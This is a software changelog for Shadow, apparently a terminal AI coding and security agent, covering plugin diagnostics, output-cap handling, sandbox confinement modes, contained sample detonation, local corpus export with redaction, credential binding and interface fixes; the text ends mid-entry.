# Changelog

All notable changes to **Shadow** are documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and the project follows [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

## [10.6.0] — 2026-10-23

Plugin packaging and provider adaptation. The theme: Shadow should absorb what varies between
installs — a plugin built for another tool, a serve with a smaller output ceiling — instead of
refusing to run or asking you to pre-compute its limits.

### Added
- **`shadow plugin doctor [<name>|<path>]`** — explains what Shadow will and won't load from a
  plugin, so you find out at install time instead of wondering why a skill is missing. Reports
  content surfaces (commands / skills / agents / workflows), files **dropped** by the
  markdown-only boundary grouped by extension, **dangling** references introduced by those drops,
  symlinked or unreadable paths, and cap usage. Diagnoses the recorded **source** tree when
  provenance points at one that still exists — the installed copy has already been stripped, so
  diagnosing it reports every script reference as missing and hides the drops entirely.
- **Skill `mode:` scoping** — a skill's frontmatter may declare `mode: security` (or a
  comma-separated list such as `security, coding`), and `SHADOW_SKILLS_MODE` selects which set
  indexes into the system prompt. Opt-in and additive: a skill with no `mode` is available
  everywhere, so existing installs are unchanged. On a 311-skill plugin this took the security
  session's skill index from ~26k tokens to ~1.4k — a 19× reduction, and the reason a large
  plugin stops being a tax on every unrelated task.
- **`onOutputCapDiscovered` → `learnedOutputCap`** — a serve that advertises its output ceiling in
  a 400 is now remembered for the session, so later turns build *under* the cap on first contact
  instead of re-discovering the same number every turn. Folded with `tighterOutputCap` (tightest
  wins) and wired into **both** provider wires, Chat Completions and Responses, through one shared
  rule so they cannot diverge.

### Changed
- **Plugin caps raised**: `PLUGIN_MAX_BYTES` 8 MB → 32 MB and `PLUGIN_MAX_FILES` 500 → 5000,
  measured against a real 2579-file / 16.6 MB plugin rather than a guess.
- Plugin internals take an optional `home` (`pluginsDir`, `listPlugins`, `describePlugin`,
  `enabledPluginDirs`, `discoverSkills`), so plugin tests can run hermetically instead of reading
  whatever happens to be installed in the developer's own `~/.shadow`.

### Fixed
- **A serve with a smaller output ceiling made the model unusable.** Requesting more output than a
  serve accepts returned a terminal `http_400` on turn 1:
  `max_completion_tokens is too large: 128000. This model supports at most 65536 completion
  tokens.` A token-overflow recovery ladder already existed and claimed to cover OpenAI-compatible
  servers, but three separate gaps meant it never fired here. (1) The predicate missed the message
  — it has no "context" word, and `max(?:imum)?[ _]?tokens` cannot match `max_completion_tokens`
  because `_completion` sits between `max` and `tokens`, so the 400 fell through every recovery
  branch. (2) Even when the ladder did fire it **halved blindly**: the serve states its ceiling in
  the same message that rejects us, and halving ignored that, walking 128000 → 64000 → 32000 for
  three round-trips and then throttling the model to *half* the ceiling it would have accepted.
  (3) Nothing was remembered, so every turn paid it again. Shadow now parses the ceiling the serve
  **accepts** — never the one it rejected, since the message carries both — and clamps to it in a
  single retry. `TOKEN_SHRINK_FLOOR` is deliberately not applied here: a serve that says "at most
  512" gets 512, and flooring would re-request a value just refused. The clamp only fires after a
  real rejection, so an untouched serve still receives its full reasoning floor — removing that
  guard breaks four pre-existing byte-identical wire-contract tests, which is how we know it is
  load-bearing.
- **`plugin doctor` cried wolf.** Its reference matcher flagged *any* `*.md` token, so prose naming
  a file in the **consuming** project — `CLAUDE.md`, `SOUL.md`, `todo.md` — was reported as a
  dangling plugin path: 378 of 819 findings on one well-formed plugin. Markdown references now
  require a path separator. Suppressing unresolvable bare basenames loses nothing, because a bare
  `.md` that *does* resolve is copied and was never reported anyway. 819 → 406 findings, and the
  dropped-file section now shows the real 1970 files instead of 1.

## [10.5.2] — 2026-10-20

Steering, detachment and sub-agent work. All three shared one shape: work the user had already
started was being killed by the machinery responsible for carrying it.

### Fixed
- **A message sent mid-turn stopped the model instead of steering it.** With text attached, a
  steer now aborts only the current *provider request*, injects the text at a paired history
  boundary, and the turn **continues** — in-flight work survives. Injection is pairing-aware and
  never lands between a `tool_use` and its `tool_result`; an in-flight call settles first. A bare
  steer with no text still stops, as before, and a hard signal always wins over steering.
- **A queued message could be silently discarded.** The Ink frontend dropped *every* queue entry
  matching the steer text, so typing `yes` twice produced one reply. Both frontends now share
  `src/agent/steerQueue.ts` and remove exactly one entry per confirmed steer.
- **Queue order could be violated.** A steer injects into the running turn and immediately issues
  a new request, so it would jump the queue. A message now only steers when nothing is queued
  ahead of it, so a later message can never overtake an earlier one or a pending `/compact`.
- **Long commands died with the session that started them.** Foreground children were killed on
  timeout or abort, and all stdio was piped to the parent: when a session went away the child took
  SIGPIPE and stopped mid-progress with no error — the "download just stopped at 63%, no
  traceback" failure. Shells now run as detached process-group leaders with **file-backed** stdio
  under `.shadow/shell-logs/`, a foreground command that needs longer is promoted to the
  background registry instead of killed, and shutdown calls `releaseForExit()` instead of
  `killAll()`, so exiting no longer reaps work the user started.
- **A running sub-agent blocked the whole session.** Running an agent or reviewer held the main
  loop, so the user could not talk to Shadow until it finished. A steer now promotes a synchronous
  agent to the background and frees the conversation; every agent's cancel path is wired, not just
  background ones, so a promoted agent stays cancellable.

### Changed
- Key-map copy for `Enter` now reads "send; fold the message into the running turn while busy,
  continuing it". `Ctrl+N` and `/agents` list every running agent, sub-agents and reviewers
  included.

## [10.5.1] — 2026-10-19

`shadow corpus` — a local-only tool for capturing **your own** sessions as training data. Shadow
ships the tool, not a dataset: no telemetry, no upload, no first-party corpus. Every user runs it on
their own machine and owns the output.

### Added
- **`shadow corpus on | off | status | export | stats`.** Capture is opt-in per workspace and
  enforced: `export` and `stats` refuse to read session logs until `on` has been run, so a
  checkout you were merely passing through is never mined for training data.
- **Trajectory normalizer** (`src/state/trajectory.ts`) — streams session JSONL into turns, pairs
  `tool_start`/`tool_end`, keeps reasoning, and flags truncated traces rather than silently
  repairing them.
- **Quality labelling** (`src/state/quality.ts`) — scores each trajectory and labels it
  `gold` / `negative` / `neutral` with human-readable reasons. Deliberately labels rather than
  filters: thrash loops and `max_iterations` runs are valuable *negative* examples, and blending
  them into one unlabelled pile is the actual mistake.
- **Deterministic session-level splits** — 90/5/5 by session id. Splitting mid-session would leak
  context across train/test and produce falsely optimistic evals.
- **Semantic dedup** — content-addressed on `(thought, action, observation)` per turn, so retries
  that differ only in timing collapse instead of all surviving.
- **`export --review`** — stages to a review directory and prints exactly which redaction patterns
  fired, so a user can look before anything leaves the machine.
- **Session provenance** (`src/state/provenance.ts`) — records model, endpoint **host only** (never
  the full URL), and Shadow version at session open, plus per-turn model attribution on `usage`
  events.

### Fixed
- **`shadow update` could silently replace nothing.** The release download applied
  `AbortSignal.timeout(60_000)` to the *whole response*. A 74 MB binary on a ~1 MB/s link takes
  ~85 s, so the transfer aborted mid-flight and the command exited 0 having installed nothing —
  a silent no-op that only shows up as a stale `--version`. The timeout now bounds **inactivity**,
  not elapsed time, so a slow-but-healthy download completes while a genuinely stalled one still
  fails. Caught while verifying this very release: the published 10.5.1 binaries were built with
  the old code, so they were rebuilt after the fix.
- **Redaction could corrupt structured tool input.** Round-tripping through
  `JSON.parse(redactString(JSON.stringify(input)))` let the connection-string matcher
  (`[^@\s/]+`) consume a JSON quote, throwing on 2 of 2098 real sessions and losing the whole
  trajectory. Redaction now walks the object and redacts string leaves; structure cannot be
  corrupted. Regression test added.
- **Bare credential values are now scrubbed where echoed.** A 40-character AWS secret access key
  has no distinguishing prefix, so shape matching alone missed it when a model repeated it back in
  a later message. The corpus harvests credential *values* from assignments anywhere in a
  trajectory and scrubs them verbatim wherever they reappear — the one place it can be safer than
  the session log it reads, because it sees the whole trajectory at once.

### Notes
- Redaction remains **best-effort** and says so. The export manifest records `redactionVersion` and
  the hit count so a user can see what actually fired.
- Capture is **retroactive**: enabling it projects sessions from before it was on. The CLI states
  this at enable time; `off` stops reading rather than promising to delete what was already
  produced.
- 29 new tests. Full suite 3651/3651.

## [10.5.0] — 2026-10-18

A readability pass on the TUI markdown viewer. Everything here was found by rendering realistic
model output through the real renderer and looking at it — not by reading the parser. The audit and
the before/after evidence are in `research/tui-markdown-audit.md`.

### Fixed — tables
- **A fitting table no longer collapses into a key:value wall at some widths and not others.** The
  `MIN_COL` floor pushed `Σwidths` back over budget, so one 4-column table gridded at 78 and 88
  columns but fell back at 82 and 84. Widening the window could break the table. The decision is
  now monotonic: grid below a single threshold, never above it.
- **Columns are no longer starved of their own words.** `Risk` was allocated 3–4 columns and
  rendered `high`/`medium` as `hig`/`h` and `med`/`ium`. Allocation now starts each column at its
  longest token width and distributes slack by need.
- **A grid never carves a token it had room to hold.** At 65–66 columns a path came out
  `src/safety/classifier.t` + `s` and a cell came out `mediu` + `m`. A grid that cannot hold a
  word now yields to the labeled key:value fallback, which reads better than a split path.
- **The key:value fallback wraps.** It used to stack raw `key: value` strings, so a 30-column pane
  got an 88-column line — the one place where giving up on the grid also gave up on fitting.
  Values wrap with a hanging indent; an over-wide key moves to its own line.
- **A vertical rule no longer appears after every row.** It spent up to 40% of the table's vertical
  space on chrome and made a wrapped table read as stacked boxes. A rule now appears only where a
  wrapped row meets its neighbour.
- **A pipe inside a code span no longer splits the cell.** `` `ls | wc -l` `` became two cells and
  shifted every later column left. Cell splitting is now code-span aware, and `\|` still renders as
  a literal pipe.
- **A long link no longer inflates its column.** The column was measured from the destination URL,
  so a 4-letter label reserved 52 columns and overflowed. Cells now measure the label.

### Fixed — hierarchy and structure
- **All six heading levels are distinguishable.** H3–H6 were pixel-identical to each other, so
  depth past H2 was unrecoverable, and every heading was `bright` — the same style the theme
  reserves for inline `**bold**`, so `### Subsection` looked like bold prose. There is now a real
  ladder: H1 bold + short underline, H2 bold + short underline, H3 accent, H4 dim-bold, H5/H6
  italic.
- **The streaming live preview matches the committed block.** `src/tui/markdown.tsx` styled
  headings by its own rules, so text changed appearance the moment the block was committed.
- **Nested ordered lists keep their numbers.** A numbered procedure with numbered sub-steps
  rendered the sub-steps as bullets, losing the numbers that carried the meaning. `orderedItems`
  and `ordinals` are parsed and carried through to every depth.
- **A multi-paragraph blockquote keeps its paragraph breaks.** Reflow collapsed `\n\n` into a
  double space and ran the paragraphs together. Soft line breaks inside a paragraph still reflow.

### Added
- `test/markdown-readability.test.ts` — 20 tests, one per defect above, each naming the observed
  symptom. 15 of them fail against the pre-change implementation (the other 5 pin behavior that
  must not regress while the rest changes). Includes a monotonicity sweep and a
  no-line-exceeds-the-pane sweep from 2 to 120 columns.

### Notes
- The web console renders markdown through `src/web/ui/vendor/markdown.js`, which is **generated**
  from `src/util/markdown.ts` by `tsconfig.web.json` (`npm run build:webui-vendor`, also run by the
  release gate). It regenerated with this change, so the TUI and the web console share the fixed
  table renderer — no separate fix was needed. The embedded bundle `src/web/bundledAssets.ts` was
  regenerated as well.
- The rendered golden fixture `test/fixtures/snowfall-frames.json` changed in styling attributes
  only — no text, no layout.

## [10.4.0] — 2026-10-18

Six capabilities adapted from [DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness)
(MIT — see `THIRD_PARTY_NOTICES.md`) that close real gaps in Shadow's confinement and context
handling. Each is a design Shadow was missing, not a reimplementation for its own sake.

### Added
- **A single sandbox policy home with a fail-safe default.** `src/safety/sandboxPolicy.ts` defines
  the three modes — `read-only`, `workspace-write`, `danger-full-access` — and the rule that decides
  which one a session runs under. `DEFAULT_SANDBOX_MODE` stays `workspace-write` (Shadow's existing
  contract); `untrustedSandboxPolicy()` selects `read-only` for detonation work, which is the mode
  you want when the code under test is hostile. Autonomy (who approves) and confinement (what the
  kernel allows) remain orthogonal axes, deliberately.
- **Read-only confinement, enforced, on macOS and Linux.** `readOnly` now threads through the
  Seatbelt profile and the bwrap flags, so `read-only` is a real boundary in both backends rather
  than a label. Five integration tests exercise the actual OS sandbox — no mocks, no skips.
- **A Landlock backend for Linux.** `native/shadow-landlock.c` + `src/safety/landlock.ts` confine
  `run_shell` with Landlock LSM where it is available. Landlock needs no unprivileged user
  namespaces, so it works in containers and on hardened Kali images where bwrap cannot start. It is
  preferred when read-confinement is requested and falls back to bwrap otherwise.
  - Verified in a Linux container: read-only blocks workspace writes, `workspace-write` permits
    them, a read outside the granted roots is denied, and the `/proc/self/root` escape is closed.
  - Two bugs were caught by that testing and fixed rather than papered over: `--ro` was being
    parsed as `--rw` (read-only silently granted writes), and directory rights were being applied to
    device nodes, which made `/dev/null` unusable inside the sandbox.
- **The session's confinement is stated to the model every request.** `src/agent/runtimeContext.ts`
  folds the effective sandbox mode, workspace root, granted roots and offline state into the system
  prompt. When confinement was requested but no backend exists, the block says so explicitly — a
  prompt that claims a boundary the kernel is not providing is worse than one that says nothing.
- **Oversized tool output is spilled, not discarded.** `src/agent/toolSpill.ts` writes the full body
  to a private `0600` file under the session tree and gives the model a head preview plus a locator.
  Previously a 40k-line `grep` or a build log with one diagnostic at line 9,000 was truncated with no
  way back, so the model re-ran the command or guessed. The preview is cut envelope-safely, and any
  spill failure degrades to exactly the old truncation rather than to an error.
- **Waterfall hook chains.** `src/hooks/waterfall.ts` adds in-process middleware with `next()`:
  short-circuit, wrap, and rewrite. The existing shell-hook runner can only append context; it
  cannot express "redact this tool result before the model sees it" or "audit around the inner
  call". A listener that forgets `next()` terminates the chain (failing toward less execution), and
  calling `next()` twice is idempotent so a missing `return` cannot double a side effect.

### Notes
- `THIRD_PARTY_NOTICES.md` records the DeepSeek Harness attribution and lists every adapted file.
- DeepSeek Harness's `telemetry/` subsystem was deliberately **not** adopted: Shadow is
  zero-telemetry by promise, and adding a phone-home path would break it.

## [10.3.2] — 2026-10-18

### Fixed
- **A slow DNS resolver no longer reads as a missing host.** `defaultResolver` ran every lookup
  under a 1.5s budget and swallowed the timeout, returning an empty answer — so the egress broker
  reported `could not be resolved`, which is indistinguishable from NXDOMAIN. On a fresh Linux
  install (cold systemd-resolved cache, VPN, container DNS) the first `shadow update` lookup could
  exceed 1.5s and report the release bucket as permanently gone while it was perfectly reachable.
  - The budget is now 5s and every lookup reports **which** failure it was: a timeout says
    `timed out after Nms (not a denial — the resolver did not answer in time)` and names the
    `SHADOW_EGRESS_DNS_BUDGET_MS` override; a genuine empty answer says `did not resolve (no
    A/AAAA records)`. Both still fail closed.
  - A timeout now surfaces as `EgressDnsTimeout` instead of being flattened into `[]`.
  - The test drives the **real** resolver through a hanging lookup rather than injecting a
    pre-made error, and was confirmed to fail with the bug reintroduced.


## [10.3.1] — 2026-10-18

### Added
- **Working indicator in the tab title.** A braille frame leads the terminal tab title while an
  agent turn is in flight and the title is rewritten bare the moment the turn ends, so an idle tab
  is completely still. The glyph leads rather than trails because terminal tab strips truncate on
  the right — a trailing marker disappears first on a narrow tab. The title animates from the
  render ticker, whose interval only runs while a turn is running, so it costs nothing at rest and
  identical escapes are not rewritten 6×/sec. `--reduced-motion` swaps the animation for a single
  static `●` that still reads as busy.
- **`test/title-activity-pty.test.ts`** — drives the real interactive TUI under a pty against a
  mock streaming provider. It asserts the escape reaches the terminal, that the frame actually
  changes mid-turn, that `--reduced-motion` never animates, and — the property most likely to
  regress — that the last title written is idle, because a spinner that cannot stop reports work
  that is not happening.

### Fixed
- **`endTurn()` settles `running` and the title inside a `finally`.** A display helper throwing
  before them would have left the tab animating forever. Presentation failures can no longer
  strand the indicator.
- **`refreshSessionTitle()` routes renames through the activity path.** Renaming a session mid-turn
  no longer drops the working glyph.

### Documentation
- **`docs/internal/KALI_LINUX_PLAN_2026-10-18.md`** — what already works on Linux, the real gaps
  (no ELF/PE parsing, no syscall or network capture, no packaging), and four phases in dependency
  order. Blocked on a Linux host, not on design.

## [10.3.0] — 2026-10-18

### Added
- **Contained detonation (`sample_run`).** Run an untrusted sample and observe what it actually
  does. The sample executes under an OS sandbox whose only writable path is a private scratch
  directory — workspace read-only, `/tmp` a private tmpfs, no inherited environment, network denied
  unless the engagement authorises it. Every dropped file is enumerated and hashed, and the receipt
  is bound to the sample's SHA-256. If no sandbox is available it **refuses to run** rather than
  detonating unconfined.
- **Exclusive write root for detonation** — threaded through both the seatbelt and bwrap backends
  so the containment guarantee is the same on macOS and Linux.
- **Detonation eval tasks** — three tasks exercising `sample_run` end to end.

### Fixed
- **`tool_search` reaches the security toolkit.** It previously reimplemented its own filter,
  ignored intent aliases, returned a bare name with no argument schema, and never promoted what it
  found into the active tool list — so a model could "discover" a tool it then could not call. It
  now matches on aliases and natural language, returns the full schema, and promotes the result.
- **Detonation shell argument off-by-one** and a **late containment check** — containment is now
  validated before the sample runs, not after.

## [10.2.0] — 2026-10-17

### Added
- **Security toolkit is now discoverable.** `tool_search` matches intent aliases as well as tool
  names, so `malware`, `ransomware`, `shellcode`, `c2`, `ioc`, `reverse`, `pentest`, `redteam`,
  `vuln`, `sarif`, `drift` and `triage` all resolve to the right tool. Previously `bin_recon` was
  reachable only by already knowing the word "recon", which left five working tools dark.
- **`prompts/policies/security-engagement.md`** — when to reach for each security tool, and the
  verification rules that are not optional (a finding is verified only by a current recorded
  `project_checks` run; `retest` fails closed without a live registry; a patch receipt is the
  record). Gated on all five tools being present so it never ships a procedure with a missing step.
- **Six security eval tasks** (`eval/security-tasks.ts`) scoring on workspace state and tool
  telemetry, covering Mach-O triage, fail-closed patching, a correct patch landing, F3EAD
  engagement persistence, the findings ledger, and integrity baselines.

### Changed
- `adaptiveThinking` and `promptCache` capability declarations are now honoured by the Anthropic
  adapter. A declaration is the authority and the model-id regex is the fallback; an explicit
  `promptCache: false` now suppresses `cache_control` markers instead of being ignored.
- The release gate now runs `typecheck:all` and `lint`. Both were checklist items only, so a
  release could go green with a lint error or a type error in `test/` and `eval/`.

### Removed
- `longContext`, `pauseTurn` and `refusalStopReason` capability fields — declared, schema-validated,
  and folded into `plan.enabled`, but never read and never on the wire. `pauseTurn` and
  `refusalStopReason` describe response handling that is already unconditional.
- The dead `securityFindings` const, which shadowed the live registration with a check-store-less
  instance whose `retest` would always fail closed.

### Fixed
- Corrected a false claim in `ultraMode.ts` and its test that the Claude catalog entry declares
  `effortScale: ['low','medium','high','xhigh']`. It declares no capabilities block at all, so
  Claude is the undeclared passthrough path, not a clamped ladder.

## [10.1.0] — 2026-10-12

- Add reusable project checks and bounded completion corrections under existing permissions,
  cancellation and budgets. Shell and shared-workspace agent mutations invalidate earlier checks.
- Add a context inspector with persistent file pins, exact managed-source exclusions, and clear
  captured-request versus provisional estimates.
- Add previewed file/hunk stage, unstage and restore, stale-state protection, retained backups,
  guarded rewind, and scoped review-to-fix prompts.
- Add local session search across explicitly selected projects, pins, tags and lineage;
  cross-project results provide a launch command without changing the active workspace.
- Add versioned executable workflows with typed inputs, no-call previews and local provenance.
  Existing Markdown runbooks remain inspectable.
- Add versioned JSON/JSONL automation, final JSON-schema validation, stable exit codes and
  ephemeral transcripts. Schema failure never replays completed tool actions.
- Add optional post-save onboarding capability probes and dated exact-endpoint capability history.
  Skips, cancellation and failures preserve setup and users' endpoint choice.
- Add local security findings, SARIF/JSON import, evidence history and redacted report export.
  Verification requires current host-recorded check results, not model claims or imported passes.
- Add extension and learned-skill review menus. No telemetry or hosted coordination is added.
- Add local tmux discovery, autocomplete, scrollback and Codex terminal controls; detach preserves
  the external session. Deliver queued follow-ups at the next safe boundary during active work.

## [10.0.4] — 2026-10-09

- Collapse completed reasoning into a compact toggle, omit empty reasoning sections, and group
  repeated grep activity so self-hosted and non-reasoning model output stays readable.

- Add an explicit per-model SGLang/Qwen chat-template thinking switch for self-hosted OpenAI
  Chat Completions endpoints; it is never inferred or forwarded to cloud and other provider wires.
- Let trusted named profiles pair a global model preset with harnesses, serial/parallel tool mode,
  iteration and result limits, context, and output budget. Endpoint-bound credentials and wire
  capabilities now follow only the exact trusted endpoint, including CLI and environment overrides.
- Make `read_file` pagination honest and machine-actionable with exact path-local continuations,
  optional continuations for completed bounded ranges, valid capped JSON, and no read-before-edit
  credit when a complete line could not be returned.
- Stop compact models that persist in identical blocked tool calls, and never reuse an earlier
  progress sentence when the current generation exhausts its output budget without visible text.
- Honor an explicit self-hosted `--base-url` during first-run bootstrap instead of entering
  onboarding or recalling endpoint-specific settings from a different preset.
- Bind automatic `/model` recall to trusted global presets, so a project preset cannot capture a
  remembered label, and reject custom endpoint overrides while a subscription account is active.
- Leave pristine workspaces untouched at startup; Shadow now opens `.shadow/jobs.sqlite` only when
  project-job state already exists or the user actually starts collaboration work.
- Make Shadow's always-on foundation provider-neutral security engineering, and add trusted local
  harness add-ons whose instructions, skills, tool scope, version, and digest are fixed when a new
  session starts. Harness selection never chooses a model, endpoint, credential, or permission.
- Add `/learn` and `/skills` for local learned-skill candidates with structured evidence and
  verification receipts, explicit operator activation, revision history, and rollback. The feature
  adds no telemetry or callback service; model-visible learning turns and tool results still go to
  the user's configured provider through normal inference.
- Add explicit subscription connections: native Sign in with ChatGPT and an unmodified official
  Claude Code engine connection. Account selection survives model/profile switching and never
  automatically falls back to API billing. Add login, status, reconnect and ChatGPT logout commands.
  Subscription token accounting remains active without applying API dollar estimates.
- Add subscription onboarding with live ChatGPT model discovery, official Claude sign-in handoff,
  cancellation, retry and save after a completed tool-response check.
- Verify complete tool responses during API/browser onboarding, preserve endpoint-specific keys,
  retain failed browser forms and refresh browser setup expiry during authenticated activity.
- Report account storage, authentication traffic and official engine receipt limits in privacy diagnostics.

## [10.0.1] — 2026-10-05

- Rebuild terminal onboarding in the shared retro style with compact provider menus, arrow/number
  selection, searchable lists, model multi-selection, editable drafts, and a final review.
- Keep a single input owner across masked key prompts; bound and cancel endpoint checks, clear
  completed timers, and offer retry/edit/manual-model recovery without losing setup entries.
- Add Cerebras, Fireworks, DeepInfra, Hugging Face, NVIDIA NIM, vLLM, SGLang, and llama.cpp presets.
- Save endpoint-specific credentials, preserve previous provider keys, support existing encrypted
  vaults, and keep keyless endpoints from inheriting another provider's key.
- Save local-file setup on confirmation and defer model loading and optional extensions until needed.
- Automatically name sessions from their opening prompt, with persistent `/rename` overrides.
- Show session names in `/resume`, its searchable completions, `/sessions` and the terminal title.
- Preserve the prior named conversation when starting `/new` or resuming another session.
- Recover readable names from older logs without rewriting their transcripts.

## [10.0.0] — 2026-10-04

- Retry transient Windows config replacement failures; preserve the complete previous file.
- Qualify the full suite across native platforms with portable fixtures and explicit POSIX-only skips.

- Updated development-only brace-expansion packages; full and runtime dependency audits are clean.

Snowfall becomes the default terminal while retaining the v9 Work Center, session history,
web controls and ACP integration. The founder approved the final full-width layout and retro
SHADOW banner for release on 2026-10-04. Distribution checks and publication are recorded in
the v10 verification report.

### Snowfall layout review — 2026-10-04

- Restore the original thick, six-row SHADOW banner for a retro terminal look. Share the artwork
  between both terminal renderers and onboarding, with narrow-screen fallbacks.
- Give the conversation the full terminal width and remove the workspace sidebar. Keep task,
  agent, context and cost totals in a compact footer with equal outer margins; detailed views
  remain available through slash commands.

### Snowfall v10 candidate — 2026-10-03

- Make the pi full-screen layout the interactive default, with responsive transcript/rail regions,
  a pinned composer and status, transcript search, prompt jumps, and complete scrollback on exit.
- Unify the flake-O brand, ice palette, crystal activity marks and two-column composer token.
  Add the Snowfall theme while preserving existing palettes and saved theme selection.
- Keep the entire streaming tail scrollable. Support managed Kitty PNG placements with durable
  file placeholders for other image formats/protocols. Restore terminal modes on signals and errors.
- Add custom slash commands to pi, preserve expanded queued pastes, and prevent search typing
  from deciding a hidden approval. Refresh model-picker selection on every render and escape
  untrusted display values without changing their underlying tool input or question answers.
- Deliberately keep Vim, experimental round-table, shell status lines and custom key maps in the
  explicit `SHADOW_TUI=ink` fallback through v10. Generate command/key documentation from code.
- Add golden terminal frames at 80/120/200 columns in every theme and production-shell tests for
  scrolling, resizing, large paste, interruption, approval focus, theme persistence and clean exit.
- Bridge Node 22's legacy fetch handlers to Undici 8 for per-request dispatchers, keeping DNS
  pinning and the offline wall intact. This fixes failed provider and local-server requests on the
  minimum supported Node version, found during the full runtime qualification.
- Bundle the actual Undici package in standalone builds so Bun honors connection pinning. Use
  Bun 1.4.2 for binary compilation; incompatible runtimes and failed executable startup now fail
  the build. Add a compiled loopback/offline transport probe.
- Qualification and founder visual review are recorded in `docs/V10_VERIFICATION.md`.

## [9.0.0] — 2026-09-29

### Work Center and operator control

- Added a renderer-neutral Work Center for agents, background shells, and plan items, with `/work`
  list/detail/filter commands, bounded activity history, ownership, elapsed time, and safe controls.
- Added session-scoped persistence and read-only cross-session queries, explicit confirmed linked
  retry, cooperative pause/resume, queued priority, web controls, and a versioned ACP extension.
- Restored the full 51-column `SHADOW` wordmark and its two-tone depth treatment. Responsive
  rendering now keeps the full mark stacked at medium widths and uses the compact fallback only
  when the wordmark itself cannot fit.
- Bumped the verified local build to `9.0.0`. No remote push, publication, deployment, or tag is
  implied by this local version change.

### Blackfrost hosting migration — 2026-09-29

- Point the installers and standalone updater at Blackfrost's existing release bucket; use
  `https://blackfrostai.com/shadow` for the website and installer entrypoints.
- Preserve signed-manifest verification, binary checksums, redirect refusal, and the updater's
  refusal of environment-selected mirrors. Disclose manual binary downloads in `doctor --privacy`.
- Make the updater regression test independent of external DNS and isolate its connection receipt.
- Resolve the billing blocker and publish a signed bridge before Redpill retirement.
- Verify Windows installers on native PowerShell 5.1 and 7; calculate SHA-256 through .NET directly
  so checksum verification does not depend on PowerShell module discovery.
- Refuse `shadow update --offline` before contacting a release server, and refresh Undici/js-yaml
  to address their reported dependency advisories.
  The separate public 8.7.1 maintenance release now carries the hosting transition.

### Renderer scope and pi daily parity — 2026-09-28

- Chose Ink as the supported, default v9 terminal. Pi remains an opt-in experimental preview through
  `SHADOW_TUI=pi`; the package stays at `9.0.0-dev.0` and no release was tagged or published.
- Defined one renderer capability contract for command help and dispatch, with explicit unavailable
  behavior instead of hidden commands or accidental fallthrough.
- Added pi daily-use behavior for manual compact and its summary alias, full model management,
  provider/local configuration, plugins, MCP, safe config, memory, doctor, and session fork.
- Corrected pi prompt history, Shift+Tab plan mode, external-editor running guards, and the session
  state transferred by resume, rewind, and fork.
- Made model switching a turn barrier; reset approvals, read evidence, attachments, tasks, plan
  state, and usage on a fresh conversation; and reset read evidence after a chat rewind.
- Matched pi's session usage, active-profile status, plugin workflow inventory, connection receipt,
  custom output styles, Markdown/HTML export, and credential status to their documented contracts.
- Fixed exports of resumed sessions so the latest durable context snapshot becomes the transcript
  baseline without duplicating earlier event records.
- Kept `/vim`, experimental `/table`, `/statusline`, custom slash commands, and custom key mappings
  Ink-only for v9. Pi `/keybindings` reports its actual fixed mapping, and renderer-specific help no
  longer claims that pi's PageUp/PageDown keys scroll the transcript.
- Added a current command/key matrix and the live-terminal, platform, behavior, and security gates
  that must pass before pi can become the default.

### Release preparation and CLI fixes — 2026-09-28

- Restored the private backup remote and documented the separate public publication workflow.
- Fixed all-project type errors and prerelease README/tag checks. Version commands prepare local
  commits and tags; publishing is a separate step.
- Made terminal, bidi, and invisible controls visible in approval previews, questions, reasons,
  and diffs across Ink, pi, and REPL, while preserving original tool inputs and answer values.
- Fixed pi `/diff`, `/files`, `/branch`, and `/permissions` accidentally invoking session resume.

### Repository cleanup — 2026-09-27

- Removed the retired dataset/ablation proposal, obsolete evaluation endpoint config, and broken
  `overhaul/` review pointer.
- Organized current guides under `docs/`, private release instructions under `docs/internal/`,
  and historical plans, research, reviews, and handoffs under `docs/archive/`.
- Updated README and project instructions to describe the actual `9.0.0-dev.0` checkpoint.
- Recorded verification results, release blockers, and the ordered CLI makeover actions in
  `docs/RELEASE_ASSESSMENT_2026-09-27.md`.

## [8.7.0] — 2026-09-10

Credentials and endpoints that describe themselves, on top of a deep-review hardening pass. An
imported Codex/ChatGPT subscription now works end to end (it carries its own backend, identity
headers, wire and refresh), a LAN inference server can track whatever model it is serving without a
config edit, and 26 defects found by an adversarial review are fixed.

### Added — Codex / ChatGPT subscription auth

- **The subscription credential now reaches the provider whole.** `resolveSubscriptionAuth` always
  returned `{bearer, baseUrl, extraHeaders, expiresAt}`; every caller kept only the bearer. A valid
  ChatGPT token was therefore posted to `api.openai.com` with none of its identity headers. The new
  `resolveProviderCredential` returns them as one indivisible unit, and the boot, model-switch,
  `/model test` and TUI build paths all consume it that way.
- **The endpoint binding is enforced, not assumed.** A subscription token is valid at exactly one
  host. If a `baseUrl` is configured that is not that host, the credential is REFUSED with a message
  naming both — rather than being relocated there. This closes a real disclosure: the previous code
  returned the bearer unconditionally, so an imported Codex token plus a proxy `baseUrl` sent a
  ChatGPT credential to a third party on every request.
- **The wire travels with the credential** (`ProviderAuthSpec.subscriptionWire`). The Codex backend
  serves the Responses API, so a request must land on `<base>/responses`; the default `openai` wire
  appends `/chat/completions`, which that host does not serve — a valid token on a path that 404s.
  A credential's wire now outranks `SHADOW_WIRE_API` in both directions.
- **Token refresh** (`src/auth/refresh.ts`). `refreshCodex` existed with no caller, so an imported
  credential silently stopped working when its token aged out (about an hour). It now refreshes
  inside a 5-minute expiry margin at boot, on model switch and on `/model test`; skipped under
  `--offline`; best-effort, so a failure leaves the stored credential in place and warns. The
  rotation recovers the account id from the `id_token` (a refresh response omits `account_id`), so
  the workspace binding survives it.
- **Honest surfaces.** `shadow login status` and `/login` report the stored credential, its endpoint
  and wire, its expiry, and whether the `SHADOW_ALLOW_IMPORT` opt-in gate is open — a stored-but-
  inert credential was previously indistinguishable from no credential. `shadow login import
  codex|grok|all` gives the import path a CLI entry point, and `shadow login codex` no longer prints
  an authorize URL implying a callback exchange that does not exist.

### Added — auto endpoint recognition (`autoModel`)

- **A preset can track whatever its endpoint is serving.** `autoModel: true` makes Shadow ask the
  endpoint's model catalog at build time and put the reported id on the wire, with the context
  window read from the same catalog (`max_model_len`, `n_ctx`, …). Restarting a self-hosted box with
  a different model needs no config edit — the case this exists for, since such a box changes models
  constantly and a preset naming one id 404s the moment it does.
- **The discovered base URL is adopted**, so a URL written with or without `/v1` self-corrects
  rather than being a coin flip.
- **Entry identity is separate from the wire model.** `cfg.model` stays the preset's stable identity
  (the `/model` picker's active row and every `cfg.models.find(m => m.model === cfg.model)` lookup
